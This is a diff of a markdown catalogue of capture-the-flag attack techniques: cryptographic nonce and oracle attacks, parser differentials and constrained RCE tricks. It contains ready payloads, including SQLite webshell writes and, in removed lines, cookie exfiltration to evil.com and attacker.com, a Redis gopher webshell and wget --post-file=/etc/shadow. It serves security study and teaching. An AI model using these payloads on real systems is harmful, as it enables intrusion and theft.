+> Cryptographic attacks that recur in top-tier CTFs and have direct real-world applicability. These go beyond textbook padding oracle and hash length extension — the focus is on **misuse patterns** where correct algorithms are deployed incorrectly.
 
-### 5.1 ECDSA Nonce Reuse → Private Key Recovery
+### 2.1 ECDSA Nonce Reuse → Private Key Recovery
 
-**What is manipulated**: If the same nonce `k` is used for two different ECDSA signatures, the private key can be algebraically recovered.
+**What is manipulated**: ECDSA security depends entirely on the uniqueness of the per-signature nonce `k`. If the same `k` is used for two different messages, the private key is algebraically recoverable.
 
 ```
-Given signatures (r, s1) and (r, s2) for messages m1 and m2:
-k = (m1 - m2) / (s1 - s2) mod n
-private_key = (s1 * k - m1) / r mod n
+Given two signatures (r, s1) and (r, s2) for messages m1 and m2:
+  k = (m1 - m2) / (s1 - s2) mod n
+  private_key = (s1 * k - m1) / r mod n
 ```
+
+**Detection**: Two signatures sharing the same `r` value indicates nonce reuse (since `r = (k * G).x`).
 
 **Practical sources of nonce reuse**:
-- `k = HMAC(private_key, message)` but message is constant (e.g., health check signing)
-- Poor entropy source during key generation (VM snapshot, container restart)
+- `k = HMAC(private_key, message)` but message is constant (e.g., health check signing, repeated API calls)
+- Poor entropy source during key generation (VM snapshot restore, container restart — entropy pool reset)
+- Deterministic ECDSA (RFC 6979) with identical inputs across different signing contexts
 - Sony PS3 ECDSA key extraction (used static `k = 4`)
 
-**Partial nonce leak (LadderLeak, Minerva)**: Even leaking a few bits of the nonce per signature enables lattice-based private key recovery with enough signatures.
+**Partial nonce leak (LadderLeak, Minerva)**: Even leaking a few bits of the nonce per signature enables lattice-based private key recovery with enough signatures (~100 signatures with 2-bit leaks).
 
-### 5.2 AES-GCM Nonce Reuse → Authentication Key Recovery + Forgery
+### 2.2 AES-GCM Nonce Reuse → Authentication Key Recovery + Forgery
 
-**What is manipulated**: GCM mode uses the same nonce to derive both the encryption keystream and the GHASH authentication key. Reusing a nonce reveals the authentication key `H`.
+**What is manipulated**: GCM mode derives both the encryption keystream and the GHASH authentication key from the same (key, nonce) pair. Reusing a nonce reveals the authentication key `H`, enabling ciphertext forgery.
 
 ```
 Given two ciphertexts C1, C2 encrypted with the same (key, nonce):
-C1 ⊕ C2 = P1 ⊕ P2  (keystream cancels)
+  C1 ⊕ C2 = P1 ⊕ P2  (keystream cancels — plaintext XOR recovery)
 
 And authentication tags T1, T2:
-T1 ⊕ T2 = GHASH_H(C1 || len1) ⊕ GHASH_H(C2 || len2)
-→ Solve polynomial equation over GF(2^128) to recover H
-→ Forge valid tags for arbitrary ciphertexts
+  T1 ⊕ T2 = GHASH_H(C1 || len1) ⊕ GHASH_H(C2 || len2)
+  → Solve polynomial equation over GF(2^128) to recover H
+  → Forge valid authentication tags for arbitrary ciphertexts
 ```
 
-**Real-world**: TLS 1.2 with AES-GCM under nonce mismanagement, JWT libraries using AES-GCM with static IVs.
+**Real-world occurrences**:
+- JWT libraries using AES-GCM with static/predictable IVs
+- TLS 1.2 servers with nonce mismanagement
+- Cloud KMS implementations with counter wrap-around
 
-### 5.3 Bleichenbacher's Attack on RSA PKCS#1 v1.5
+### 2.3 RSA Attacks Beyond Textbook
 
-**What is manipulated**: The server reveals whether RSA-decrypted ciphertext has valid PKCS#1 v1.5 padding (starts with `0x00 0x02`). This 1-bit oracle enables full plaintext recovery.
+#### 2.3.1 Bleichenbacher's Attack on PKCS#1 v1.5
+
+**What is manipulated**: The server reveals (via error message, timing, or behavior difference) whether RSA-decrypted ciphertext has valid PKCS#1 v1.5 padding (starts with `0x00 0x02`). This 1-bit oracle enables full plaintext recovery.
 
 ```
 For each guess:
   c' = c * s^e mod n  (multiply ciphertext by s^e for chosen s)
   Send c' to server
-  If server says "valid padding" → s is in a valid range → narrow down plaintext interval
+  If server says "valid padding" → s constrains the plaintext range
+  Iterate: narrow the interval until plaintext is determined
 ```
 
 **Complexity**: ~1 million queries for a 2048-bit RSA key.
 
-**Modern variants**: ROBOT attack (2017) found Bleichenbacher oracles in major TLS implementations (F5, Citrix, Cisco, Palo Alto). DROWN attack exploited SSLv2 Bleichenbacher oracle to decrypt TLS 1.2 sessions.
+**Modern variants**:
+| Attack | Year | Impact |
+|--------|------|--------|
+| ROBOT | 2017 | Bleichenbacher oracles in F5, Citrix, Cisco, Palo Alto TLS |
+| DROWN | 2016 | SSLv2 oracle to decrypt TLS 1.2 sessions |
+| CAT | 2023 | Bleichenbacher-variant in TLS implementations via Marvin attack |
 
-### 5.4 RSA Partial Key Exposure (Coppersmith's Method)
+#### 2.3.2 Coppersmith's Method (Partial Key Exposure)
 
-**What is manipulated**: If partial bits of an RSA private key are known (e.g., low bits of `d` leaked via side-channel), the full key can be reconstructed using lattice reduction.
+**What is manipulated**: If partial bits of an RSA private key `d` are known (e.g., lower 25% leaked via side-channel, memory dump, or corrupted key file), the full key can be reconstructed using lattice reduction.
 
 ```python
-# Sage/SageMath:
+# SageMath:
 # Given n, e, and partial d (e.g., lower 512 bits of a 2048-bit key):
 d_low = 0x...  # known lower bits
-# Construct polynomial and find small roots using Coppersmith
+# Construct polynomial: e * d_low ≡ 1 (mod 2^512) → factor n
+# Apply Coppersmith's small_roots() to find the full d
 ```
 
-**PlaidCTF 2025 (Tales from the Crypt)**: Required recovering a corrupted RSA private key from a pcap containing TLS traffic, using partial key exposure techniques to reconstruct the key and decrypt sessions.
+**PlaidCTF 2025 (Tales from the Crypt)**: Recovering a corrupted RSA private key from a pcap containing TLS traffic — partial key exposure + lattice techniques → full key → session decryption.
 
-### 5.5 CBC Padding Oracle as Encryption Oracle
+#### 2.3.3 Hastad's Broadcast Attack
 
-**What is usually missed**: A padding oracle not only **decrypts** arbitrary ciphertext but also **encrypts** arbitrary plaintext. By chaining intermediate values backward, you construct valid ciphertext for any desired plaintext.
+**What is manipulated**: When the same plaintext is encrypted with RSA (small `e`, typically `e=3`) to multiple recipients with different moduli, CRT reconstruction recovers the plaintext.
 
 ```
-Standard padding oracle: Ciphertext → Plaintext (decryption)
-Reverse operation: For desired plaintext P:
-  Choose random final block C_n
-  Use oracle to find intermediate value I_n for C_n
-  Compute C_{n-1} = I_n ⊕ P_n
-  Repeat backward through all blocks
-  → Valid ciphertext for arbitrary plaintext, without knowing the key
+Given: c1 = m^3 mod n1, c2 = m^3 mod n2, c3 = m^3 mod n3
+CRT: C = c1*N1*y1 + c2*N2*y2 + c3*N3*y3 (mod n1*n2*n3)
+m = ∛C (integer cube root, since m^3 < n1*n2*n3)
 ```
 
-**Impact escalation**: This turns a **read** primitive (decryption) into a **write** primitive (forging valid encrypted tokens). If the application uses CBC-encrypted cookies for authorization, you can forge admin tokens.
+#### 2.3.4 Franklin-Reiter Related Message Attack
 
-### 5.6 PRNG State Recovery from Partial / Transformed Output
+**What is manipulated**: If two RSA ciphertexts encrypt messages with a known linear relationship (`m2 = a*m1 + b`), the plaintext can be recovered without the private key.
 
-**Beyond basic 624-output recovery** — real-world CTF scenarios where PRNG output is partially observable or transformed:
+```
+Given: c1 = m1^e mod n, c2 = (a*m1 + b)^e mod n
+When e = 3: polynomial GCD over Z/nZ recovers m1
+```
+
+**CTF pattern**: Common when a server encrypts a user-controlled message with a fixed prefix/suffix (e.g., `flag + user_input`).
+
+### 2.4 CBC Padding Oracle as Encryption Oracle
+
+**What is usually missed**: A padding oracle doesn't only **decrypt** — it also **encrypts** arbitrary plaintext, without knowing the key.
+
+```
+Standard: Ciphertext → Plaintext (decryption oracle)
+
+Reverse (encryption oracle):
+  For desired plaintext block P_n:
+    Choose random C_n (final ciphertext block)
+    Use padding oracle to discover intermediate value I_n for C_n
+    Compute C_{n-1} = I_n ⊕ P_n
+    Repeat backward through all blocks
+  → Produces valid ciphertext for arbitrary plaintext
+
+Cost: 256 × block_count oracle queries per plaintext block
+```
+
+**Impact escalation**: This turns a **read** primitive (decryption) into a **write** primitive (forging valid encrypted tokens). If the application uses CBC-encrypted cookies for authorization, a padding oracle becomes an admin token forge.
+
+### 2.5 PRNG State Recovery from Partial / Transformed Output
+
+> Beyond the textbook "collect 624 consecutive 32-bit outputs to clone Mersenne Twister" — real CTF scenarios involve partial, truncated, or transformed outputs.
+
+#### 2.5.1 Z3 Symbolic Solver Approach
 
 ```python
 # Google CTF 2025 (Postviewer v5):
-# Random values encoded as base36 strings → only 5-6 chars visible
-# Approach:
-# 1. Recover base36-encoded values from leaked messages
-# 2. Convert back to numeric ranges (base36 → integer)
-# 3. Each value constrains a few bits of MT state
-# 4. Use Z3 symbolic solver with bit constraints
-# 5. Recover full MT state → predict future values (salt, nonces)
+# Random values were encoded as base36 strings → only 5-6 chars visible per output
+# Each value constrains a few bits of the MT state
 
 from z3 import *
-# symbolic_mersenne_cracker: feed partial outputs as constraints
+
+# Create symbolic MT state (624 × 32-bit BitVecs)
+state = [BitVec(f's{i}', 32) for i in range(624)]
+solver = Solver()
+
+# For each observed partial output:
+#   1. Symbolically compute the MT tempering transformation
+#   2. Add constraint: lower N bits == observed value
+# Example for truncated output (lower 16 bits only):
+for i, observed in enumerate(observations):
+    symbolic_output = temper(state, i)  # symbolic MT output
+    solver.add(Extract(15, 0, symbolic_output) == observed)
+
+if solver.check() == sat:
+    model = solver.model()
+    recovered_state = [model[s].as_long() for s in state]
 ```
 
-**Truncated output recovery**: When only lower N bits of each MT output are visible, the `symbolic_mersenne_cracker` Z3 approach recovers full state with ~700+ partial observations.
+#### 2.5.2 Common Partial Observation Scenarios
+
+| Scenario | Observable | Bits per Output | Outputs Needed |
+|----------|-----------|----------------|----------------|
+| Full MT output | All 32 bits | 32 | 624 |
+| Lower 16 bits only | `rand() & 0xFFFF` | 16 | ~1,250 |
+| Modular reduction | `rand() % N` | log2(N) | Varies |
+| Base36 encoding | 5-6 character string | ~26 | ~800 |
+| Float [0,1) | `rand() / 2^32` | ~23 (mantissa) | ~900 |
+| Boolean | Coin flip | 1 | ~20,000 |
+
+**Tools**: `symbolic_mersenne_cracker` (Python/Z3), `randcrack` (624-output case), `php_mt_seed` (PHP mt_rand).
+
+### 2.6 Hash Length Extension Attack Variants
+
+While the basic hash length extension (MD5, SHA-1, SHA-256) is well-known, CTFs feature variants:
+
+| Variant | Mechanism |
+|---------|-----------|
+| **Double HMAC bypass** | `H(secret || H(secret || msg))` — if inner hash is accessible, extend the outer |
+| **Truncated hash extension** | Hash output is truncated; extension still works, but forged tag has multiple valid extensions (collision space) |
+| **Custom Merkle-Damgård constructions** | CTF-custom hash functions with MD construction — same extension principle applies |
+| **HMAC-then-encrypt** | If MAC is computed before encryption, padding oracle + length extension combine |
 
 ---
 
-## 6. Client-Side Isolation Bypass
+## 3. Non-HTTP Parser Differentials
 
-> Advanced browser mechanism abuse for cross-origin data exfiltration, beyond basic postMessage/cookie tricks.
+> Parser inconsistencies that create security-relevant discrepancies in **non-HTTP** data formats. HTTP-level parser differentials (request smuggling, URL confusion, header parsing) are covered in dedicated documents. This section covers format-level differentials that surface in CTFs and real-world multi-service architectures.
 
-### 6.1 `window.name` Cross-Origin Data Channel
+### 3.1 YAML 1.1 vs 1.2 Boolean Parsing
 
-**What is manipulated**: `window.name` persists across cross-origin navigations. A page at origin A can set `window.name`, navigate to origin B, and B reads the same `window.name`.
-
-```javascript
-// On target.com (via XSS or reflected injection):
-window.name = document.cookie;  // or any sensitive data
-window.location = 'https://attacker.com/collect';
-
-// On attacker.com/collect:
-document.title = window.name;  // contains target's cookies
-```
-
-**Key insight**: Unlike `document.cookie` (same-origin) or `localStorage` (same-origin), `window.name` has no origin restriction on read/write. It survives cross-origin navigation.
-
-### 6.2 DOM Clobbering → React/Angular Router Hijack
-
-**What is manipulated**: React Router accesses `document.defaultView.history` for navigation. DOM clobbering `defaultView` breaks the reference chain.
-
-```html
-<!-- DiceCTF 2024: -->
-<!-- Clobber document.defaultView to inject controlled history object -->
-<iframe name="defaultView" src="data:text/html,<script>...</script>"></iframe>
-
-<!-- Also: react-router reads HTMLAnchorElement.href for route resolution -->
-<!-- Clobber with <a> tags to redirect routing -->
-```
-
-**Angular variant**: Angular's `DomSanitizer` checks `document.createElement` — clobbering `document.createElement` affects sanitization logic.
-
-### 6.3 CSS `:has()` Selector for Arbitrary DOM Content Exfiltration
-
-**What is manipulated**: The CSS `:has()` selector (supported since 2023) enables parent selection based on child content, creating new exfiltration channels.
-
-```css
-/* Exfiltrate text content via sibling/child relationship: */
-/* If an element with id="secret" has text starting with 'a': */
-body:has(#secret[data-value^="a"]) { background: url(https://evil.com/?a); }
-
-/* Exfiltrate element existence: */
-body:has(div.admin-panel) { background: url(https://evil.com/?is_admin); }
-
-/* Chained with @import for recursive extraction: */
-@import url(https://evil.com/next-css?known=abc);
-/* Server dynamically generates CSS that probes the next character */
-```
-
-**Key insight**: `:has()` is a relational pseudo-class that enables CSS-only data exfiltration without `<input>` elements — it can detect the presence/absence of any DOM structure.
-
-### 6.4 Client-Side Desync (Browser-Powered Smuggling)
-
-**What is manipulated**: The browser itself sends a request that causes desync between the browser's HTTP stack and the server's, allowing the attacker to poison subsequent same-connection requests.
-
-```javascript
-// Stale CL-based CSD:
-fetch('https://target.com/endpoint', {
-    method: 'POST',
-    body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
-    headers: { 'Content-Type': 'text/plain' },
-    mode: 'cors',
-    credentials: 'include'
-});
-// Browser thinks it sent one request
-// Server processes two → second request carries victim's cookies
-```
-
-**James Kettle (PortSwigger)**: Introduced CSD at Black Hat USA 2022. The browser acts as the desync front-end, no proxy required.
-
-### 6.5 Speculation Rules API / Prefetch Side-Channel
-
-**What is manipulated**: Chrome's Speculation Rules API (`<script type="speculationrules">`) prefetches pages in the background. The prefetch status is detectable via Performance API.
-
-```html
-<script type="speculationrules">
-{
-  "prefetch": [{ "urls": ["https://target.com/search?q=secret"] }]
-}
-</script>
-<!-- If the prefetched response differs based on query (e.g., 200 vs 404),
-     the prefetch timing/status reveals information -->
-```
-
----
-
-## 7. Parser Differential Edge Cases
-
-> Subtle inconsistencies between parsers that create security-relevant discrepancies. Focus on non-obvious cases not covered in HTTP smuggling or URL confusion taxonomies.
-
-### 7.1 YAML 1.1 vs 1.2 Boolean Parsing
-
-**What is manipulated**: YAML 1.1 treats `yes`, `no`, `on`, `off`, `y`, `n` as booleans. YAML 1.2 does not.
+**What is manipulated**: YAML 1.1 treats `yes`, `no`, `on`, `off`, `y`, `n` as booleans. YAML 1.2 removed this — they're strings.
 
 ```yaml
-# YAML 1.1 (Ruby, Python PyYAML):
+# YAML 1.1 (Ruby's Psych, Python's PyYAML):
 admin: no      # parsed as: admin: false
 country: no    # parsed as: country: false (not the string "no"!)
 
-# YAML 1.2 (Go, Rust, newer parsers):
+# YAML 1.2 (Go's yaml.v3, Rust's serde_yaml, newer parsers):
 admin: no      # parsed as: admin: "no" (string)
 ```
 
-**Exploitation**: Configuration injection where `no` is intended as a country code ("Norway") but parsed as boolean `false`, or vice versa. Combined with framework-specific YAML loading, this creates auth bypass or configuration corruption.
+**Parser version mapping**:
 
-### 7.2 JSON Number Precision Loss (IEEE 754)
+| Language/Library | YAML Version | `no` Parses As |
+|-----------------|-------------|----------------|
+| Python PyYAML (`yaml.load`) | 1.1 | `False` |
+| Python PyYAML (`yaml.safe_load`) | 1.1 | `False` |
+| Python strictyaml | 1.2 | `"no"` |
+| Ruby Psych | 1.1 | `false` |
+| Go `gopkg.in/yaml.v2` | 1.1 | `false` |
+| Go `gopkg.in/yaml.v3` | 1.2 | `"no"` |
+| JavaScript `js-yaml` | 1.2 (default) | `"no"` |
+| Rust `serde_yaml` | 1.2 | `"no"` |
 
-**What is manipulated**: JSON numbers are parsed as IEEE 754 double-precision floats, which have 53 bits of mantissa. IDs > 2^53 lose precision.
+**Exploitation scenarios**:
+- **Auth bypass via config**: YAML config file `require_2fa: no` (intended as "not configured") parsed as `false` by a 1.1 parser → 2FA disabled
+- **Country code bug**: Norway (`NO`) in a YAML config parsed as boolean `false` → downstream validation failures. This was a real GitHub Actions bug.
+- **Cross-service differential**: Service A (Python) writes YAML with `enabled: no` meaning string "no". Service B (Go yaml.v2) reads it as boolean `false`.
+
+### 3.2 JSON Superset Differentials (JSON5 / JSONC / Relaxed JSON)
+
+**What is manipulated**: Some systems accept JSON5, JSONC, or "relaxed JSON" while validators/WAFs check strict JSON. Discrepancies in comment handling, trailing commas, and quote styles create injection opportunities.
 
 ```javascript
-// Server sends: {"id": 9007199254740993}
-// JavaScript parses: 9007199254740992 (precision lost!)
-// This creates ID collision/confusion
-
-// Exploitation: Two different objects with IDs near 2^53 may
-// resolve to the same numeric value in the client
-```
-
-**Practical impact**: Twitter famously had to switch to string IDs because tweet IDs exceeded 2^53. Applications using numeric IDs near this boundary are vulnerable to ID confusion.
-
-### 7.3 JSON5 / JSONC / JSON Superset Differential
-
-**What is manipulated**: Some backends accept JSON5 or JSONC (JSON with comments) while validators check strict JSON.
-
-```
-// Passes JSON validation (ignored as comment by JSON5 parser):
+// Comment injection — passes strict JSON validator, comment interpreted by JSON5 parser:
 {
   "role": "user" // ,"role": "admin"
 }
+// Strict JSON validator: sees "role": "user" (rest is syntax error, but some validators are lenient)
+// JSON5 parser: ignores comment, but if the parser is buggy or the comment trick works with newlines:
 
-// JSON5 trailing comma:
-{"a": 1, "b": 2,}  // Valid JSON5, invalid JSON
+// Trailing comma differential:
+{"a": 1, "b": 2,}  // Valid JSON5, invalid strict JSON
 
-// JSON5 single quotes:
-{'role': 'admin'}  // Valid JSON5, invalid JSON
+// Single quotes:
+{'role': 'admin'}  // Valid JSON5, invalid strict JSON
+
+// Multiline strings:
+{"cmd": "first \
+second"}  // JSON5 allows backslash-newline continuation
+
+// Hexadecimal numbers:
+{"port": 0x1F90}  // JSON5: 8080, strict JSON: invalid
+
+// Infinity/NaN:
+{"val": Infinity}  // JSON5: valid, strict JSON: invalid
 ```
 
-### 7.4 Multipart Boundary Ambiguity
+**Real-world**: Configuration files processed by JSON5-compatible loaders (`tsconfig.json`, VS Code settings) where input validation uses strict JSON parsing.
 
-**What is manipulated**: The multipart boundary delimiter is defined in the Content-Type header, but different parsers handle edge cases differently (spaces, quotes, semicolons in boundary).
+### 3.3 Regex Engine Differentials
 
-```
-Content-Type: multipart/form-data; boundary="abc;def"
-```
+**What is manipulated**: Different regex engines (PCRE, PCRE2, RE2, JavaScript, Python `re`, Java `Pattern`) handle edge cases differently, creating bypass opportunities when a WAF uses one engine and the application uses another.
 
-**Parser A** (WAF): boundary = `abc` (stops at semicolon)
-**Parser B** (backend): boundary = `abc;def` (respects quotes)
-→ WAF sees different field boundaries than the backend → injection.
+| Differential | Engine A | Engine B | Exploitation |
+|-------------|----------|----------|-------------|
+| **`[A-z]` range** | Includes `[\]^_\`` (ASCII 91-96) | Some engines reject as invalid | Google CTF 2024 "Grand Prix Heaven" — path validation bypass via `\` in `[A-z]` range |
+| **Backtracking limits** | PCRE has configurable `pcre.backtrack_limit` | RE2 is non-backtracking (linear time) | PCRE regex times out (returns error), RE2 always completes |
+| **Possessive quantifiers** | PCRE/Java support `a++` | Python `re` does not | Regex written for PCRE, tested on Python — different matching behavior |
+| **Unicode category `\p{}`** | Java/PCRE2 support `\p{L}` | JavaScript (ES2018+) requires `/u` flag | Unicode letter bypasses depending on flag/engine |
+| **`\b` word boundary** | ASCII-only in most engines | Unicode-aware in some | Boundary mismatch for multibyte characters |
+| **Named captures** | `(?P<name>)` (Python) vs `(?<name>)` (JS/PCRE2) | Syntax differs | Cross-language regex portability bugs |
+| **Newline handling** | `$` matches `\n` in some modes | `$` matches only end-of-string in others | Multiline injection past `$`-anchored patterns |
 
-### 7.5 nginx `merge_slashes` + Backend Path Differential
+### 3.4 Encoding Differential Between Processing Stages
 
-**What is manipulated**: nginx with `merge_slashes on` (default) normalizes `//` to `/`, but many backends preserve double slashes.
+**What is manipulated**: When an input passes through multiple processing stages that handle encoding differently, the transformation pipeline creates injection opportunities.
 
-```
-Request: GET //admin/panel
-nginx (proxy): → /admin/panel (merged) → matches location /admin/ → applies auth
-Backend: → //admin/panel → may not match /admin/ prefix → bypasses auth
-
-Request: GET /static/..%2f/admin/panel
-nginx: static file, no auth needed
-Backend (path normalization): /admin/panel → sensitive endpoint
-```
+| Stage Differential | Mechanism | Example |
+|-------------------|-----------|---------|
+| **Chunked encoding per-chunk charset** | Validator reads entire file in one charset; browser processes each chunk with potentially different encoding | HITCON CTF 2024 "HTML Upload" |
+| **BOM (Byte Order Mark) injection** | Prepending UTF-8 BOM (`\xEF\xBB\xBF`) causes some parsers to switch encoding mode, others to ignore it | JSON parser ignores BOM; XML parser changes encoding |
+| **Double encoding across services** | Service A URL-decodes once, Service B URL-decodes again | `%2527` → Service A: `%27` → Service B: `'` |
+| **Charset mismatch in `<meta>` vs HTTP header** | HTTP header says `utf-8`; HTML `<meta charset="shift-jis">` — browser follows one, WAF follows the other | Multibyte character eating backslash in Shift-JIS |
 
 ---
 
-## 8. Injection into Exotic Processing Engines
+## 4. Constrained Exploitation Primitives
 
-> Server-side injection vectors targeting non-standard processing engines.
+> Techniques born from CTF challenges that impose extreme constraints — 4-byte command length limits, single bit-flips, 30-byte SQL injection windows. These constraints force the invention of genuinely novel exploitation primitives that have no analogue in standard vulnerability taxonomies. The techniques here are directly applicable to real-world scenarios where WAFs, input length limits, or restricted environments create similar constraints.
 
-### 8.1 Edge Side Include (ESI) Injection — Advanced Chains
+### 4.1 Filesystem as Command Assembly Buffer (4–5 Byte RCE)
 
-Beyond basic `<esi:include>`:
+**What is manipulated**: When command execution is limited to N characters per invocation, the filesystem itself becomes a Turing-complete assembly buffer — file *names* encode command fragments, and `ls` output order reconstructs the full command.
 
-```xml
-<!-- ESI + XSLT (Varnish with XSLT support): -->
-<esi:include src="/page" stylesheet="http://attacker.com/evil.xslt" />
-<!-- Applies attacker-controlled XSLT transformation to the included content -->
-
-<!-- ESI variable access (Akamai): -->
-<esi:assign name="cookie_val" value="$(HTTP_COOKIE{session})"/>
-<esi:include src="http://attacker.com/steal?s=$(cookie_val)"/>
-<!-- Exfiltrates session cookie via ESI variable expansion -->
-
-<!-- ESI try/except for blind detection: -->
-<esi:try>
-  <esi:attempt><esi:include src="http://internal.svc:8080/"/></esi:attempt>
-  <esi:except><!-- service not reachable --></esi:except>
-</esi:try>
-```
-
-**Detection trick**: Inject `<esi:include src="http://burpcollaborator.net"/>` in any reflected input. If a callback arrives, ESI processing is active.
-
-### 8.2 XSLT Injection — Cross-Processor RCE Gadgets
-
-| Processor | RCE Gadget | Payload |
-|-----------|-----------|---------|
-| Xalan-J | `java.lang.Runtime` | `rt:exec($rtObj, 'id')` via extension namespace |
-| Saxon | `saxon:evaluate()` | Dynamic XPath with code execution |
-| libxslt (PHP) | `php:function()` | `php:function('system', 'id')` |
-| .NET `XslCompiledTransform` | `msxsl:script` | Inline C# code in XSLT |
-| Python `lxml` | `exsl:document()` | Write arbitrary files |
-
-### 8.3 HTML-to-PDF SSRF — Engine-Specific Bypasses
-
-| Engine | Bypass | Technique |
-|--------|--------|-----------|
-| wkhtmltopdf | `--disable-local-file-access` bypass | `<meta http-equiv="refresh">` to `file://` before flag is set |
-| Puppeteer | `--no-sandbox` + `file://` | Chrome's `file://` access when launched without sandbox |
-| WeasyPrint | CSS `@page` exploitation | `@page { background: url(http://169.254.169.254/) }` — CSS properties trigger HTTP requests |
-| mPDF | SSRF via `<annotation>` | `<annotation file="/etc/passwd" content="" icon="Graph" title="x" pos-x="0" />` |
-| Prince XML | `prince-pdf-script` header | Inline JavaScript execution in PDF context |
-
-### 8.4 LaTeX Injection — `\write18` Alternatives
-
-When `--shell-escape` is disabled:
-```latex
-% LuaTeX (often installed alongside pdfTeX):
-\directlua{os.execute("id")}
-
-% Read files character by character (bypass line-length limits):
-\catcode`\_=12  % change catcode to read underscores
-\newread\f \openin\f=/etc/passwd
-\loop \unless\ifeof\f \read\f to\l \l \repeat
-
-% Exfiltrate via DNS (no outbound HTTP needed):
-\newread\f \openin\f=/etc/hostname
-\read\f to\hostname
-% Use \hostname in a URL that triggers DNS lookup
-```
-
-### 8.5 Redis Protocol Injection via SSRF (RESP Protocol)
-
-**What is manipulated**: When an SSRF can reach Redis (port 6379), the RESP protocol can be injected via HTTP redirects or Gopher URLs because Redis accepts inline commands.
-
-```
-# Via Gopher:
-gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT
-
-# Translates to:
-SET shell "<?php system($_GET['c']);?>"
-CONFIG SET dir /var/www/html
-CONFIG SET dbfilename shell.php
-SAVE
-QUIT
-```
-
-**Advanced — Redis MODULE LOAD for native RCE**: If Redis 4.0+ allows module loading, upload a `.so` via `SET` + `CONFIG SET dir/dbfilename` + `MODULE LOAD`.
-
-**Slave-of attack**: Force Redis to replicate from attacker-controlled server → inject `.so` module via replication protocol.
-
----
-
-## 9. Argument & Environment Injection
-
-> Combined taxonomy of CLI argument injection and environment variable manipulation for RCE.
-
-### 9.1 Flag Injection Through Safe-Looking APIs
-
-When `execFile` (not `exec`) is used and command separators are blocked:
-
-| Program | Flag | Effect |
-|---------|------|--------|
-| `git clone` | `--upload-pack="id>/tmp/out"` | Arbitrary command during clone |
-| `git log` | `--output=/tmp/x --format=%H` | Write to arbitrary file |
-| `curl` | `--next http://evil` + `-o /tmp/shell` | Chain multiple requests, save to file |
-| `wget` | `--post-file=/etc/shadow` | Exfiltrate file contents |
-| `ssh` | `-o ProxyCommand="id"` | Execute command during connection |
-| `rsync` | `-e 'sh -c id'` | Set remote shell to execute commands |
-| `tar` | `--to-command=id` | Pipe extracted files through command |
-| `sendmail` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | Write mail log as webshell |
-| `zip` | `-T -TT 'sh -c id;#'` | Execute command during test |
-| `ffmpeg` | `-i http://evil/malicious.m3u8` | SSRF via playlist processing |
-| `chromium` | `--renderer-cmd-prefix=id` | Command execution on render |
-
-### 9.2 Wildcard Glob Expansion as Argument Injection
-
+**5-byte variant** (HITCON CTF 2017 "Babyfirst Revenge"):
 ```bash
-# If root runs: tar czf backup.tar.gz *
-# Attacker creates files:
-touch -- '--checkpoint=1'
-touch -- '--checkpoint-action=exec=sh x.sh'
-echo 'id > /tmp/pwned' > x.sh
+# Each HTTP request executes: exec(input) where len(input) <= 5
+# Strategy: create files whose names are command fragments, then assemble
 
-# When glob expands, tar sees flags:
-tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh x.sh file1.txt ...
+>dir        # create empty file named "dir"
+>sl         # create empty file named "sl"
+>g\>        # create file named "g>"
+>ht-        # create file named "ht-"
+*>v         # glob-expand all filenames and write to file "v"
+            # v now contains: "dir sl g> ht-" (or similar, depending on glob order)
+
+>rev        # create file named "rev"
+*v>x        # run "rev" on "v" contents → produces "ls -th >g" (reversed)
+sh x        # execute "ls -th >g" — list files sorted by time into file "g"
+sh g        # execute the assembled command in file "g"
 ```
 
-**Affected commands**: `tar`, `chown --reference`, `chmod --reference`, `rsync -e`, `7z -T`.
+**4-byte variant** (HITCON CTF 2017 "Babyfirst Revenge v2"): Same principle but requires additional tricks — `rev` command to reverse strings, continuation-line backslashes (`\`) split across multiple filenames, and glob expansion as an intermediate processing step.
 
-### 9.3 Prototype Pollution → `process.env` → Environment Variable RCE
+**Key insight**: This is essentially a write-primitive-to-RCE chain using only the filesystem. Applicable whenever:
+- Command length is severely restricted (WAF, input validation)
+- Multiple command invocations are possible (e.g., repeated HTTP requests)
+- The filesystem is writable and listable
+
+### 4.2 Single Bit-Flip Source Code Corruption
+
+**What is manipulated**: Given the ability to flip exactly *one* bit in one byte of a source code file, achieve RCE by strategically corrupting the interpreter's source.
+
+**HITCON CTF 2021 "One-Bit Man"**: Flip one bit in any PHP file under `/var/www/html/` (WordPress installation).
+
+```
+Attack model:
+  Input: (filename, byte_offset, bit_position 0-7)
+  Effect: XOR one bit at the specified location
+  Constraint: Exactly ONE bit flip total
+
+Strategy:
+  1. Identify a PHP file where a single character change creates an exploitable condition
+  2. Map ASCII characters to their 1-bit-flip neighbors:
+     '=' (0x3D) → flip bit 5 → ']' (0x5D) — breaks comparison
+     'i' (0x69) → flip bit 5 → 'I' (0x49) — changes function name
+     '0' (0x30) → flip bit 0 → '1' (0x31) — changes boolean/number
+  3. Find the exact byte in WordPress where this creates auth bypass or code injection
+```
+
+**Real-world applicability**: Rowhammer attacks, cosmic ray bit flips in memory, and hardware fault injection all produce single-bit corruption. Understanding which bit flips in which files create exploitable conditions is directly relevant to fault analysis.
+
+### 4.3 SQLite `VACUUM INTO` as File-Write Primitive
+
+**What is manipulated**: SQLite's `VACUUM INTO('path')` command dumps the entire database contents into a new file at an arbitrary path — converting SQL injection into arbitrary file write.
+
+**HITCON CTF 2025 "Pholyglot"**: 30-character SQL injection into an INSERT statement.
+```sql
+-- Injected payload (≤30 chars):
+');VACUUM INTO('f.php
+
+-- Full assembled query:
+INSERT INTO t VALUES('');VACUUM INTO('f.php')
+
+-- Multi-stage exploitation:
+-- 1. First requests: INSERT PHP code fragments into the database
+-- 2. Final request: VACUUM INTO writes the DB (containing PHP code) to a .php file
+-- 3. The PHP webshell is now accessible via HTTP
+```
+
+**Key conditions**:
+- SQLite database (common in mobile apps, embedded systems, small web apps)
+- SQL injection with statement termination (`;`)
+- Writable filesystem path accessible via web
+
+**Variant — SQLite `ATTACH DATABASE`**: Similar file-write primitive: `ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(d TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["c"]); ?>');`
+
